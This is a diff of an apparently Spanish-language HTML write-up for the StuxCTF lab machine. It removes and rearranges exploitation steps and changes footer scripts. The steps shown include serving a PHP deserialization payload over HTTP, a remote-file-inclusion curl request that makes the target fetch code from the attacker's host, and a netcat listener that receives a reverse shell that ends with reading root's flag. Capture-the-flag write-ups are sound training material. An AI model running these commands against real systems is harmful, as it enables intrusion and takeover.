@@ -359,32 +359,19 @@ $exploit <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize<
 </ul>
 <ol>
 <li></li>
+<li></li>
+<li>
+</li>
 </ol>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ php exp.php &gt; not_a_shell.txt 
-</code></pre></div><ol start=2>
+<p>[&mldr;]</p>
+<pre tabindex=0><code>4.
+```bash
+╰─ lanfran@parrot ❯ nc -nlvp 1337                                                                                                  ─╯
+listening on [any] 1337 ...
+</code></pre><ol start=5>
 <li></li>
 </ol>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo python3 -m http.server <span style=color:#ae81ff>80</span>                                                                                 ─╯
-<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
-Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span>http://0.0.0.0:80/<span style=color:#f92672>)</span> ...
-</code></pre></div><ol start=3>
-<li></li>
-</ol>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl http://stuxctf.thm/473150289372648955391313281766843507325770399840230051892039938856873289<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>77050807800832928198526567069446044422855055/<span style=color:#ae81ff>\?</span>file<span style=color:#ae81ff>\=</span>http://your_TUN0_IP/not_a_shell.txt
-File no Exist!&lt;!DOCTYPE html&gt;
-    &lt;head&gt;
-        &lt;title&gt;StuxCTF&lt;/title&gt;
-<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
-</code></pre></div><ol start=4>
-<li></li>
-</ol>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
-listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
-</code></pre></div><ol start=5>
-<li></li>
-</ol>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl http://stuxctf.thm/473150289372648955391313281766843507325770399840230051892039938856873289<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>77050807800832928198526567069446044422855055/this_is_totally_not_a_shell.php
-</code></pre></div><p>Finalmente Beneficio.</p>
+<p>Finalmente Beneficio.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
 listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
 connect to <span style=color:#f92672>[</span>10.9.2.251<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.250.63<span style=color:#f92672>]</span> <span style=color:#ae81ff>57118</span>
@@ -446,7 +433,10 @@ root@ubuntu:/home/grecia# cat /root/root.txt
 </div>
 </footer>
 <script src=/assets/main.js></script>
-<script src=/assets/prism.js></script>
+<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
+<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
+<script type=module src=/assets/ionicons/ionicons.esm.js></script>
+<script nomodule src=/assets/ionicons/ionicons.js></script>
 </div>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
 <script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
